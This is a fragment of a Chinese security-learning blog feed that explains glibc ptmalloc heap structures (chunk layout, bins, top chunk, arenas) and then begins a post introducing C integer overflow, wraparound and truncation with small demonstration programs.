title="堆相关的数据结构"></a>堆相关的数据结构</h1><p>glibc内部有精心设计的数据结构来管理它：</p><ul><li>宏观结构：包含堆的宏观信息，可通过这些数据结构索引对的基本信息</li><li>微观结构：用于处理堆分配与回收中的内存块</li></ul><h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><p>这里先讲微观结构，堆的漏洞利用和这些相关</p><h3 id="malloc-chunk概述"><a href="#malloc-chunk概述" class="headerlink" title="malloc_chunk概述"></a>malloc_chunk概述</h3><p>我们成malloc申请的内存为chunk。这些内存在ptmalloc内部用malloc_chunk结构体来表示，</p><p>当程序申请的chunk被free后，会被加入到响应的空闲管理列表中。</p><p>无论一个chunk有多大，无论处于malloc状态还是free状态，他们的结构都是一样的。</p><p>malloc_chunk结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里有INTERNAL_SIZE_T，SIZE_SZ，MALLOC_ALIGN_MASK的解释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/ * INTERNAL_SIZE_T是用于内部记录块大小的。</span><br><span class="line">   默认版本与<span class="keyword">size_t</span>相同。</span><br><span class="line">   尽管不是绝对必要，但最好将其定义为无符号类型，即使<span class="keyword">size_t</span>是有符号类型也是如此。这可以避免某些系统的人为大小限制。</span><br><span class="line">   在<span class="number">64</span>位计算机上，通过将INTERNAL_SIZE_T定义为<span class="number">32</span>位“ <span class="keyword">unsigned</span> <span class="keyword">int</span>”，您可以减少<span class="built_in">malloc</span>开销。</span><br><span class="line">   不能处理超过<span class="number">2</span> ^ <span class="number">32</span>的已分配空间的开销。如果可以接受此限制，除非您在要求<span class="number">16</span>字节对齐的平台上，否则建议您进行设置。在这种情况下，对齐要求最终抵消了减小<span class="keyword">size_t</span>字大小的任何潜在优势。</span><br><span class="line">   实现者：谨防以下情况的可能组合：</span><br><span class="line">     -INTERNAL_SIZE_T可能是有符号的或无符号的，可能是<span class="number">32</span>位或<span class="number">64</span>位，并且宽度可能与<span class="keyword">int</span>相同或与<span class="keyword">long</span>相同</span><br><span class="line">     -<span class="keyword">size_t</span>的宽度和签名可能与INTERNAL_SIZE_T不同</span><br><span class="line">     -<span class="keyword">int</span>和<span class="keyword">long</span>可能是<span class="number">32</span>或<span class="number">64</span>位，并且可能是相同的宽度</span><br><span class="line">   为了解决这个问题，INTERNAL_SIZE_T之间的大多数比较和差值计算都应将它们强制转换为无符号长整数，并意识到将无符号<span class="keyword">int</span>强制转换为较宽长整数不会对符号进行扩展的事实。 （这也使检查负数变得很尴尬。）其中的某些强制转换在某些系统上会导致无害的编译器警告。 * /</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INTERNAL_SIZE_T</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding word size.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure><p>一般来说，size_t在64位中是64位无符号整数，32位中是32位无符号整数。</p><p>malloc_chunk的具体解释如下：</p><ul><li>prev_size：如果该chunk的 物理相邻的前一个chunk是空闲的话，那该处记录的是前一个chunk的大小(<strong>包含chunk头</strong>)。如果物理相邻的前一个chunk处于malloc状态，那么此处可以填写前一个chunk的数据。</li><li>size：该chunk的大小(prev_size+size+user data)，必须是2*SIZE_SZ的整数倍。如果申请的内存不是2*SIZE_SZ的整数倍，那么向上取整。32位中SIZE_SZ是4；64位中是8。该字段的 低3bit位对chunk大小没有影响，依次为：<ul><li>NON_MAIN_ARENA(A)：记录当前chunk是否属于主线程，1表示不属于，0表示属于。</li><li>IS_MAPPED(M)：记录当前chunk是否是由mmap分配的。</li><li>PREV_INUSE(P)：记录前一个chunk是否被分配。一般来说，堆中第一个被分配的内存块的该位都会被设为1，以便防止访问前面的非法内存；当该位是0时，可以通过prev_size字段来获取上一个chunk的大小和地址。也方便空闲chunk之间的合并。</li></ul></li><li>fd，dk：chunk处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下：<ul><li>fd指向下一个(<strong>非物理相邻</strong>)空闲的chunk。</li><li>bk指向上一个(<strong>非物理相邻</strong>)空闲的chunk。</li><li>通过bk和fd可以将空闲的chunk加入到空闲的chunk链表进行统一管理</li></ul></li><li>fd_nextsize，bk_nextsize：只有chunk空闲时候才使用，**用于较大的chunk(large chunk)**。<ul><li>  fd_nextsize：指向前一个与当chunk大小不同的第一个空闲快，不含bin的头指针。</li><li>  k_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>  一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。</li></ul></li></ul><p>一个已经分配的 chunk 的样子如下。<strong>我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          |</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               .</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>被free的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>可以发现，如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小</p><ol><li>本身的 size 字段会记录，</li><li>它后面的 chunk 会记录。</li></ol><p>一般情况下，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>bin这个概念是与<strong>内存回收</strong>相关堆，也就是堆管理器会根据用户已经申请到堆内存空间大小进行释放，决定放入哪类bins当中去。</p><p>用户释放的chunk不会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中空闲的chunk。当用户再次malloc时，ptmalloc分配器会识图在空闲的chunk中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。</p><p><strong>ptmalloc将相似大小堆chunk用双向线标链接起来，这样的一个链表叫做一个bin</strong>。</p><p>ptmalloc一共维护了128个bin，并使用一个数组来存储这些bin。</p><p>数组中<strong>bin 1为unsorted bin</strong>；<strong>bin 2到63为small bin</strong>；<strong>bin 64到126为large bin</strong></p><p>具体的实现中，ptmalloc采用分箱式的方法对空闲的chunk进行管理。</p><p>首先，他会根据空闲chunk的大小及使用状态将chunk初步分为4类：fast bins，small bins，large bins，unsorted bin。每一类中仍有更详细的划分。相似大小的chunk会使用双向链表链接起来。也就是说，在每一类bin的内部仍有多个互不相关的链表来保存不同大小的chunk.<br><img src="/2021/03/03/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/1614781245754.png"></p><p>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。这些 bin 对应的数据结构在 malloc_state 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure><p>一个bin相当于一个chunk链表，每个链表的头结点chunk作为bins数组，但由于这个头结点作为bin表头，prev_size与size字段是没有任何实际作用的，因此在存储头结点chunk的时候仅仅只需存储头结点chunk的fd和bk即可，而其中的prev_size与size字段被重用为另一个bin的头结点的fd和bk，这样可节省空间，并提高可用性。。因此<strong>我们仅仅只需要 mchunkptr 类型的指针数组就足够存储这些头节点</strong>，那 prev_size 与 size 字段到底是怎么重用的呢？这里我们以 32 位系统为例：</p><table><thead><tr><th align="left">含义</th><th align="left">bin1 的 fd/bin2 的 prev_size</th><th align="left">bin1 的 bk/bin2 的 size</th><th align="left">bin2 的 fd/bin3 的 prev_size</th><th align="left">bin2 的 bk/bin3 的 size</th></tr></thead><tbody><tr><td align="left">bin 下标</td><td align="left">0</td><td align="left">1</td><td align="left">2</td><td align="left">3</td></tr></tbody></table><p>可以看出除了第一个 bin（unsorted bin）外，后面的每个 bin 的表头 chunk 会重用前面的 bin 表头 chunk 的 fd 与 bk 字段，将其视为其自身的 prev_size 和 size 字段。这里也说明了一个问题，<strong>bin 的下标和我们所说的第几个 bin 并不是一致的。同时，bin 表头的 chunk 头节点 的 prev_size 与 size 字段不能随便修改，因为这两个字段是其它 bin 表头 chunk 的 fd 和 bk 字段。</strong></p><p>数组中的 bin 依次介绍如下：</p><ol><li>第1个为 unsorted bin，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li><li>从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 <strong>2 个机器字长</strong>，即 32 位相差 8 字节，64 位相差 16 字节。</li><li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li></ol><p>此外，上述这些 bin 的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲 chunk 不能在一起</strong>。</p><p>需要注意的是，并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk 先放到 fast bins 的容器内。<strong>而且，fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。</strong></p><h4 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h4><p>fast bin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，<strong>会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</strong></p><p>描述：</p><ol><li>x86中，当用户释放堆堆块大小小于64B时使用fast bin进行管理，即chunk空间最大为80字节。</li><li>fast bin只用了fd，是单链表。</li><li>fast bin不会对P位进行操作，即它不会主动进行合并，只有在某些特定堆情况下，堆管理器才会对fast bin进行合并。</li><li>fast binY为管理fast bin的数组，每个成员分别管理不同大小的fast bin链表，且均指向了当前链表的尾结点，当尾结点被分配时，通过fd指针指向前一个节点。</li><li>当用户申请chunk的大小小于或等于<strong>MAX_FAST_SIZE</strong>时，优先从fast bin中查找相应的空闲块，且规则为LIFO。</li></ol><h4 id="Small-bin"><a href="#Small-bin" class="headerlink" title="Small bin"></a>Small bin</h4><p>small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：<code>chunk_size = 2 * SIZE_SZ *index</code>，具体如下：</p><table><thead><tr><th align="left">下标</th><th align="left">SIZE_SZ=4（32 位）</th><th align="left">SIZE_SZ=8（64 位）</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">16</td><td align="left">32</td></tr><tr><td align="left">3</td><td align="left">24</td><td align="left">48</td></tr><tr><td align="left">4</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">5</td><td align="left">40</td><td align="left">80</td></tr><tr><td align="left">x</td><td align="left">2*4*x</td><td align="left">2*8*x</td></tr><tr><td align="left">63</td><td align="left">504</td><td align="left">1008</td></tr></tbody></table><p>small bins 中一共有 62 个循环双向链表，每个链表中存储的 chunk 大小都一致。</p><p>描述：</p><ol><li>small bin为双向链表，且使用FIFO,所以同一个链表中先被释放的 chunk 会先被分配出去。</li><li>当满足small bin条件的chunk被释放后，会优先被放入unosrted bin，只有在一定情况下，才会被分配到small bin中。</li></ol><h4 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h4><p>large bins中一共包含63个bin，每个bin中的chunk的大小不一致，而是处于一定的区间范围没，此外，这63个bin被分为了6组，每个bin中的chunk大小之间的公差一致，如下：</p><table><thead><tr><th align="left">组</th><th align="left">数量</th><th align="left">公差</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64B</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512B</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096B</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768B</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144B</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">不限制</td></tr></tbody></table><p>这里以 32 位平台的 large bin 为例，第一个 large bin 的起始 chunk 大小为 512 字节，位于第一组，所以该 bin 可以存储的 chunk 的大小范围为 [512,512+64)</p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><ol><li>unsorted bin可以视为空闲chunk回归其所属bin之前的缓冲区。</li><li>当释放较小或较大的chunk的时候，为了增加分配效率，系统会先将最近释放的chunk添加到unsorted bin中</li><li>unsorted bin 为一个双向循环链表，对chunk的大小没有限制，即任何大小的chunk都可以放入unsorted bin链表中</li></ol><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>程序在第一次进行malloc时，heap会分为两部分，一部分给用户，另一部分就是top chunk。</p><p>top chunk是处于当前堆的物理地址的最高的chunk，这个chunk不属于任何一个bin，当所有的 bin 都无法满足用户请求的内存大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 heap 进行扩展后再进行分配。在 main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的 heap。</p><h2 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>在之前介绍的例子中，无论是主线程还是新创建的线程，在第一次申请内存时，都会有独立的 arena。</p><p>但不是每个线程都有独立的arena，对于不同的系统，arena数量的约束如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores.</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;堆利用&quot;&gt;&lt;a href=&quot;#堆利用&quot; class=&quot;headerlink&quot; title=&quot;堆利用&quot;&gt;&lt;/a&gt;堆利用&lt;/h1&gt;&lt;p&gt;目前堆的实现有很多种，具体如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;dlmalloc  – Gene</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>整数溢出</title>
    <link href="http://example.com/2021/03/03/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
    <id>http://example.com/2021/03/03/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</id>
    <published>2021-03-03T03:17:41.000Z</published>
    <updated>2021-06-01T16:14:30.498Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="整数溢出介绍"><a href="#整数溢出介绍" class="headerlink" title="整数溢出介绍"></a>整数溢出介绍</h2><p>C语言中整数的分类及各自的大小范围：</p><table><thead><tr><th>类型</th><th>字节</th><th>范围</th></tr></thead><tbody><tr><td>short int</td><td>2byte(word)</td><td>0~32767(0~0x7fff) -32768~-1(0x8000~0xffff)</td></tr><tr><td>unsigned short int</td><td>2byte(word)</td><td>0~65535(0~0xffff)</td></tr><tr><td>int</td><td>4byte(word)</td><td>0~2147483647(0~0x7fffffff) -2147483648~-1(0x80000000~0xffffffff)</td></tr><tr><td>unsigned int</td><td>4byte(word)</td><td>0~4294967295(0~0xffffffff)</td></tr><tr><td>long</td><td>8byte(word)</td><td>正: 0~0x7fffffffffffffff 负: 0x8000000000000000~0xffffffffffffffff</td></tr><tr><td>unsigned long</td><td>8byte(word)</td><td>0~0xffffffffffffffff</td></tr></tbody></table><p>正是因为这些类型的大小范围的限制导致整数溢出。</p><h2 id="整数溢出原理"><a href="#整数溢出原理" class="headerlink" title="整数溢出原理"></a>整数溢出原理</h2><p>整数溢出的异常有3种：</p><ul><li>溢出<ul><li> 只有有符号数才会发生溢出。</li><li> 溢出标志<strong>OF</strong>可检测有符号数的溢出</li></ul></li><li>回绕<ul><li>无符号数<strong>0-1</strong>时会变成最大的数，1字节的话会变为255，255+1时会变为0.</li><li>进位标志<strong>CF</strong>可检测无符号数的回绕</li></ul></li><li>截断<ul><li>就是将一个较大宽度的数放入一个宽度较小的数中，高位发生截断</li></ul></li></ul><h3 id="有符号整数溢出"><a href="#有符号整数溢出" class="headerlink" title="有符号整数溢出"></a>有符号整数溢出</h3><p>分为上溢出和下溢出</p><ul><li>上溢出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">2147483647</span>;<span class="comment">//int的最大值</span></span><br><span class="line">i++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line"><span class="comment">//输出为最小负数</span></span><br></pre></td></tr></table></figure><ul><li>下溢出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">-2147483648</span>;<span class="comment">//int的最小值</span></span><br><span class="line">i--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line"><span class="comment">//输出为最大正数</span></span><br></pre></td></tr></table></figure><h3 id="无符号整数回绕"><a href="#无符号整数回绕" class="headerlink" title="无符号整数回绕"></a>无符号整数回绕</h3><p>无符号数的计算不会溢出，但是会发生回绕</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsined <span class="keyword">int</span> i = <span class="number">4</span> <span class="number">294</span> <span class="number">967</span> <span class="number">295</span>;<span class="comment">//x86-32上为4 294 967 295</span></span><br><span class="line">i++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);<span class="comment">//输出为0</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">i--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);<span class="comment">//输出为4 294 967 295</span></span><br></pre></td></tr></table></figure><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><ul><li>加法截断</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff + 0x00000001</span><br><span class="line">= 0x0000000100000000 (long long)</span><br><span class="line">= 0x00000000 (long)</span><br></pre></td></tr></table></figure><ul><li>乘法截断</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00123456 * 0x00654321</span><br><span class="line">= 0x000007336BF94116 (long long)</span><br><span class="line">= 0x6BF94116 (long)</span><br></pre></td></tr></table></figure><h3 id="整数提升和宽度溢出"><a href="#整数提升和宽度溢出" class="headerlink" title="整数提升和宽度溢出"></a>整数提升和宽度溢出</h3><p>看代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l;  </span><br><span class="line">    <span class="keyword">short</span> s;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    l = <span class="number">0xabcddcba</span>;</span><br><span class="line">    s = l;</span><br><span class="line">    c = l;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;宽度溢出\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;l = 0x%x (%d bits)\n&quot;</span>, l, <span class="keyword">sizeof</span>(l) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s = 0x%x (%d bits)\n&quot;</span>, s, <span class="keyword">sizeof</span>(s) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = 0x%x (%d bits)\n&quot;</span>, c, <span class="keyword">sizeof</span>(c) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整型提升\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s + c = 0x%x (%d bits)\n&quot;</span>, s+c, <span class="keyword">sizeof</span>(s+c) * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">OUT：</span><br><span class="line">    </span><br><span class="line">$ ./a.out</span><br><span class="line">宽度溢出</span><br><span class="line">l = <span class="number">0xabcddcba</span> (<span class="number">32</span> bits)</span><br><span class="line">s = <span class="number">0xffffdcba</span> (<span class="number">16</span> bits)</span><br><span class="line">c = <span class="number">0xffffffba</span> (<span class="number">8</span> bits)</span><br><span class="line">整型提升</span><br><span class="line">s + c = <span class="number">0xffffdc74</span> (<span class="number">32</span> bits)</span><br></pre></td></tr></table></figure><p>在整数转换的过程中，有可能导致下面的错误：</p><ul><li>损失值：转换为值的大小不能表示的一种类型</li><li>损失符号：从有符号类型转换为无符号类型，导致损失符号</li></ul><h3 id="漏洞多发函数"><a href="#漏洞多发函数" class="headerlink" title="漏洞多发函数"></a>漏洞多发函数</h3><p>下面的两个函数都有一个 <code>size_t</code> 类型的参数，常常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span 